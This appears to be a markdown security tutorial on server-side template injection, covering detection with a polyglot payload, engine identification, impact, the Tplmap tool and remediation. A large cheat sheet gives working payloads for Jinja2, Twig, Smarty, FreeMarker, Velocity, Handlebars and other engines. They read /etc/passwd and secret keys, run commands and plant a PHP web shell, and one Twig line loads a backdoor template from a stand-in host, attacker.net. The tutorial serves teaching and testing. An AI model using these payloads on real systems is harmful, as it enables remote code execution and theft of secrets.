@@ -1,0 +1,263 @@
+![example](./1.png)
+---
+
+## What is SSTI?
+
+Server-side template injection is a vulnerability where the attacker injects malicious input into a template to execute commands 
+on the server-side. This vulnerability occurs when invalid user input is embedded into the template engine which can 
+generally lead to remote code execution (RCE).
+
+Template engines are designed to combine templates with a data model to produce result documents which helps populating dynamic 
+data into web pages. Template engines can be used to display information about users, products etc. 
+
+Some of the most popular template engines can be listed as the followings:
+---
+
+-   PHP – Smarty, Twigs
+
+-   Java – Velocity, Freemaker
+
+-   Python – JINJA, Mako, Tornado
+
+-   JavaScript – Jade, Rage
+
+-   Ruby – Liquid
+
+When input validation is not properly handled on the server side, a malicious server-side template injection payload can 
+be executed on the server which can result in remote code execution.
+
+## How Does It Work?
+---
+
+For the sake of simplicity, imagine you're testing the parameter of the following request:
+
+```
+POST /some-endpoint HTTP/1.1
+Host: vulnerable-website.com
+parameter=value
+
+```
+To detect the vulnerability, use the polyglot payload as the value of the parameter which is a sequence of 
+special characters such as the following:
+
+```
+POST /some-endpoint HTTP/1.1
+Host: vulnerable-website.com
+parameter=${{<%[%'"}}%\.
+
+```
+
+To identify the template engine, read the error message:
+
+Error message code example
+
+If the error message is not displaying the template engine, we can test via known syntaxes for the popular template engines:
+
+```
+=${7*3}
+={{7*3}}
+=<%= 7*3 %>
+
+```
+Check out the documentation of the manual for the template engine (which is Django in this case) and use the following 
+payload to read the debug output:
+
+```
+POST /some-endpoint HTTP/1.1
+Host: vulnerable-website.com
+parameter={% debug %}
+
+```
+
+The output will contain a list of objects and properties to which you have access from within this template:
+
+![example-2](./2.png)
+---
+
+Read the secret key using the 'settings' object that's available:
+---
+
+```
+POST /some-endpoint HTTP/1.1
+Host: vulnerable-website.com
+parameter={{settings.SECRET_KEY}}
+
+```
+
+### What's the Impact of SSTI?
+---
+
+The impact of server-side template injection vulnerabilities is generally critical, resulting in remote code execution 
+by taking full control of the back-end server. Even without the code execution, the attacker may be able to read 
+sensitive data on the server. There are also rare cases where an SSTI vulnerability is not critical, depending 
+on the template engine.
+
+## How To Identify the Vulnerability?
+---
+
+To identify SSTI vulnerabilities, use a Polyglot payload composed of special characters commonly used in template 
+expressions to fuzz the template.
+
+> ${{<%[%'"}}%\.
+
+In case of a vulnerability, an error message can be returned or the exception can be raised by the server. 
+This can be used to identify the vulnerability and the template engine in use.
+
+# To identify the vulnerability, the following to-do list can be followed:
+---
+
+-   Detect where the template injection exist
+
+-   Identify the template engine and validate the vulnerability
+
+-   Follow the manuals for the specific template engine
+
+-   Exploit the vulnerability
+
+The following cheat sheet can be used to identify the template engine in use: 
+![example-3](./3.png)
+---
+
+# Automated Tools
+---
+
+`Tplmap` assists in the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with several 
+sandbox escape techniques to get access to the underlying operating system.
+
+The tool and its test suite are developed to research the SSTI vulnerability class and to be used as 
+offensive security tools during web application penetration tests.
+
+
+## Cheatsheet
+---
+
+```
+-------------------------------------------------------------------
+Polyglot:
+${{<%[%'"}}%\
+-------------------------------------------------------------------
+FreeMarker (Java):
+${7*7} = 49
+<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
+--------------------------------------------------------------------
+(Java):
+${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+${T(java.lang.System).getenv()}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+--------------------------------------------------------------------
+Twig (PHP):
+{{7*7}}
+{{7*'7'}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+--------------------------------------------------------------------
+Smarty (PHP):
+{$smarty.version}
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+-------------------------------------------------------------------
+Handlebars (NodeJS):
+wrtz{{#with "s" as |string|}}
+{{#with "e"}}
+{{#with split as |conslist|}}
+{{this.pop}}
+{{this.push (lookup string.sub "constructor")}}
+{{this.pop}}
+{{#with string.split as |codelist|}}
+{{this.pop}}
+{{this.push "return require('child_process').exec('whoami');"}}
+{{this.pop}}
+{{#each conslist}}
+{{#with (string.sub.apply 0 codelist)}}
+{{this}}
+{{/with}}
+{{/each}}
+{{/with}}
+{{/with}}
+{{/with}}
+{{/with}}
+-------------------------------------------------------------------
+Velocity:
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end
+-------------------------------------------------------------------
+ERB (Ruby):
+<%= system("whoami") %>
+<%= Dir.entries('/') %>
+<%= File.open('/example/arbitrary-file').read %>
+-------------------------------------------------------------------
+Django Tricks (Python):
+{% debug %}
+{{settings.SECRET_KEY}}
+--------------------------------------------------------------------
+Tornado (Python):
+{% import foobar %} = Error
+{% import os %}{{os.system('whoami')}}
+--------------------------------------------------------------------
+Mojolicious (Perl):
+<%= perl code %>
+<% perl code %>
+-------------------------------------------------------------------
+Flask/Jinja2: Identify:
+{{ '7'*7 }}
+{{ [].class.base.subclasses() }} # get all classes
+{{''.class.mro()[1].subclasses()}}
+{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
+-------------------------------------------------------------------
+Flask/Jinja2: 
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+--------------------------------------------------------------------
+Jade:
+#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+--------------------------------------------------------------------
+Razor (.Net):
+@(1+2)
+@{// C# code}
+--------------------------------------------------------------------
+
+```
+
+## Remediation
+---
+
+Remediations for the SSTI vulnerability depend on the different template engines in use. There are 2 common suggestions 
+to remediate this vulnerability:
+
+-   Sanitization: Sanitize user input before passing it into the templates to minimize vulnerabilities from any malicious.
+
+-   Sandboxing: In case using risky characters is a business need, it is recommended to use a sandbox within a safe environment.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
